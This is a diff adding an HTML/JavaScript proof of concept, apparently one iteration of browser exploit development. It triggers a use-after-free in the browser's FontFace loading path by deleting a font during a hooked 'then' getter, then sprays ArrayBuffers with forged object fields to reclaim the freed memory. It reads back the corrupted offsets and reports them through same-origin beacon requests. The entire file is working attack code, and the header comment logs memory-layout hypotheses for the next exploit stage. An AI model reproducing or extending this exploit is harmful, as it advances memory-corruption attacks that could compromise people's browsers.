@@ -1,0 +1,155 @@
+<!--
+  p598 v8: Third data point for +0x64 read-modify-write hypothesis.
+
+  v7 showed the engine changes +0x60..+0x67 markers:
+    spray 0xAAAAAAAA → result 0x54555555 at +0x64  (lane1)
+    spray 0xBBBBBBBB → result 0x76777777 at +0x64  (lane2)
+  v6 showed +0x64=0 when spray was 0 (ArrayBuffer default).
+
+  Hypothesis: engine does f(x) at +0x64 where f(0)=0.
+  Test: lane1 spray +0x64 = 0 (zero seed), lane2 spray +0x64 = 0xCCCCCCCC.
+  Also verify a non-hit lane to confirm spray survived.
+
+  CRASH_CLASS: LOW (pure observation)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p598v8</title>
+<style id="v1">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<style id="v2">@font-face{font-family:sb;src:local(Helvetica);unicode-range:U+0044}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+function wQ(v,o,hi,lo){wD(v,o,lo);wD(v,o+4,hi);}
+
+var stage=0, lane1=null, lane2=null;
+var hit1=-1, hit2=-1;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){
+  if(stage===0){stage=1;
+    document.getElementById('v1').remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('F1');
+    lane1=[];
+    for(var i=0;i<2048;i++) lane1.push(new Uint8Array(new ArrayBuffer(192)));
+    for(var j=0;j<lane1.length;j++){
+      var v=lane1[j];
+      wD(v,0x00,2);           // rc seed
+      wQ(v,0x58,0,0);         // m_table = null
+      wQ(v,0x68,0,0);         // W field = null
+      // +0x60..+0x67: DO NOT WRITE — leave as ArrayBuffer zeros (zero seed)
+      v[0x82]=3;              // status
+      v[0x85]=0xAA;           // m_mayBePurged seed
+    }
+    b('S1:'+lane1.length);
+    return;
+  }
+  if(stage===2){stage=3;
+    document.getElementById('v2').remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('F2');
+    lane2=[];
+    for(var i=0;i<2048;i++) lane2.push(new Uint8Array(new ArrayBuffer(192)));
+    for(var j=0;j<lane2.length;j++){
+      var v=lane2[j];
+      wD(v,0x00,2);
+      wQ(v,0x58,0,0);
+      wQ(v,0x68,0,0);
+      // Spray +0x64 with 0xCCCCCCCC marker (leave +0x60 as zero)
+      wD(v,0x64,0xCCCCCCCC);
+      v[0x82]=3;
+      v[0x85]=0xAA;
+    }
+    b('S2:'+lane2.length);
+    return;
+  }
+  return;
+},set:function(){}});
+
+function main(){
+b('G');
+
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+setTimeout(function(){
+  if(!lane1){b('UAF1:NO-SPRAY');return;}
+
+  for(var i=0;i<lane1.length;i++){
+    var v=lane1[i], rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    if(rc!==2||t0){ hit1=i; break; }
+  }
+  if(hit1<0){b('UAF1:NO-HIT');return;}
+
+  var v1=lane1[hit1];
+  b('L1:lane='+hit1+',rc='+rD(v1,0));
+  b('L1:T=0x'+rQ(v1,0x58));
+  b('L1:W=0x'+rQ(v1,0x68));
+  b('L1:+60=0x'+rQ(v1,0x60));
+
+  // Read dword at +0x64 explicitly
+  var d64_hit = rD(v1,0x64);
+  b('L1:+64d=0x'+d64_hit.toString(16));
+
+  // Verify a non-hit lane (lane 0 if hit!=0, else lane 1)
+  var ctrl = (hit1===0) ? 1 : 0;
+  var vc = lane1[ctrl];
+  b('CTRL:lane='+ctrl+',rc='+rD(vc,0)+',+64d=0x'+rD(vc,0x64).toString(16));
+
+  // Trigger UAF-2
+  b('TRIGGER-UAF2');
+  stage=2;
+  var pb=new FontFace('pb','local(Arial)',{unicodeRange:'U+0043'});
+  document.fonts.add(pb);void pb.loaded;
+  document.fonts.load('1em pb, sb','CD').then(function(){},function(){});
+}, 150);
+
+// Verify at 600ms
+setTimeout(function(){
+  if(stage<3){b('UAF2:NOT-FIRED,stage='+stage);return;}
+
+  if(lane2){
+    for(var i=0;i<lane2.length;i++){
+      var v2=lane2[i], rc2=rD(v2,0);
+      var t0=v2[0x58]|v2[0x59]|v2[0x5A]|v2[0x5B]|v2[0x5C]|v2[0x5D]|v2[0x5E]|v2[0x5F];
+      if(rc2!==2||t0){ hit2=i; break; }
+    }
+  }
+
+  b('HITS:L1='+hit1+',L2='+hit2);
+
+  if(hit2>=0){
+    var v2=lane2[hit2];
+    b('L2:rc='+rD(v2,0));
+    b('L2:T=0x'+rQ(v2,0x58));
+    b('L2:W=0x'+rQ(v2,0x68));
+    b('L2:+60=0x'+rQ(v2,0x60));
+    var d64_hit2 = rD(v2,0x64);
+    b('L2:+64d=0x'+d64_hit2.toString(16));
+
+    // Verify non-hit lane2
+    var ctrl2 = (hit2===0) ? 1 : 0;
+    var vc2 = lane2[ctrl2];
+    b('CTRL2:lane='+ctrl2+',rc='+rD(vc2,0)+',+64d=0x'+rD(vc2,0x64).toString(16));
+  } else {
+    b('L2:NO-HIT');
+  }
+
+  // Cross-lane comparison for PRE=POST (lane1 unchanged after UAF-2)
+  if(hit1>=0){
+    b('L1-POST:+60=0x'+rQ(lane1[hit1],0x60));
+  }
+
+  b('ALL-DONE');
+}, 600);
+
+setTimeout(function(){b('ALIVE');},2000);
+setTimeout(function(){b('ALIVE2');},5000);
+}
+setTimeout(main,0);
+</script></head><body>p598v8</body></html>
